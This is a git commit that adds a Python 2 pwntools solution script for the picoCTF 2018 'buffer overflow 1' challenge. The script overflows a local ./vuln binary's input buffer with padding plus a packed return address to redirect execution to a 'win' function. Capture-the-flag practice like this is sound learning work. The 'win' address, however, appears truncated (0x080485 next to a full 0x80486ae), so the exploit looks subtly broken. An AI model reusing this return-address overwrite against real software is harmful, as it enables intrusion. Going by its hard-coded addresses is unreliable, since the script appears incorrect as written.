7f3a8546dd9096d26f82000641a218aa3158f1f0
casper <cpr1014@gmail.com>
2019-04-19 13:49:59 +0800

    bufferoverflow1

---
+++ PWN/picoCTF2018/bufferoverflow1/sol.py
@@ -0,0 +1,16 @@
+# python2
+# coding=utf-8
+from pwn import *
+
+win=0x080485
+vuln=0x80486ae
+
+ret=0xffffd5cc
+start_get=0xffffd5a0
+
+padding=ret-start_get
+
+p=process('./vuln')
+p.recvuntil('Please enter your string:')
+p.sendline('a'*padding + p32(win))
+print p.recvall()
